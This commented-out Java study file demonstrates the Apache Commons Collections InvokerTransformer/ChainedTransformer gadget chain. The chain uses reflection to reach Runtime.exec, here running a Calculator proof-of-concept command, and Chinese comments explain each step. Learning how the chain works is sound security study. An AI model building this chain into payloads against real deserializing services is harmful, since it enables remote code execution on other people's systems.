//package com.sec.exploits.CommonsCollections;
//
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//
//import java.lang.reflect.Method;
//
///**
// * @program: Gadgets
// * @description:
// * @author: 0range
// * @create: 2021-05-12 14:20
// **/
//
//
//public class Demo {
//    public static void main(String[] args) throws Exception {
////        InvokerTransformer it = new InvokerTransformer(
////                "exec",
////                new Class[]{String.class},
////                new String[]{"open /Applications/Calculator.app"}
////        );
//////        //得到Runtime.getRuntime()实例input
//////        Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
//////
//////        //为了能触发exec.invoke(input,"cmd"),需要执行transform方法
//////        it.transform(input);
////
////        Transformer[] transformers = new Transformer[] {
////                //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例
////                // new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
////                new ConstantTransformer(Runtime.getRuntime()),
////                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open /Applications/Calculator.app"})
////        };
////        Transformer transformerChain = new ChainedTransformer(transformers);
////        transformerChain.transform(null);
//
//        Method gm = Class.forName("java.lang.Class").getMethod("getMethod", new Class[]{String.class, Class[].class});
//        System.out.println(gm.getName());//getMethod
//        Method gr = (Method)gm.invoke(Class.forName("java.lang.Runtime"), "getRuntime", new Class[]{});//后两个参数对应getMethod方法的参数
//        System.out.println(gr.getName());//getRuntime
//        Method i = (Method)gm.invoke(Class.forName("java.lang.reflect.Method"), "invoke", new Class[] {Object.class, Object[].class});
//        System.out.println(i.getName());//invoke
//        Method exec = (Method)gm.invoke(Class.forName("java.lang.Runtime"), "exec", new Class[] {String.class});
//        System.out.println(exec.getName());//exec
//
//
//        //1.客户端构建攻击代码
//        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
//        Transformer[] transformers = new Transformer[] {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[]{}}),
//                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[]{}}),
//                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open /Applications/Calculator.app"})
//        };
//        //将transformers数组存入ChaniedTransformer这个继承类
//        Transformer transformerChain = new ChainedTransformer(transformers);
//
//
//        transformerChain.transform(null);
//
//
//
//
//    }
//}
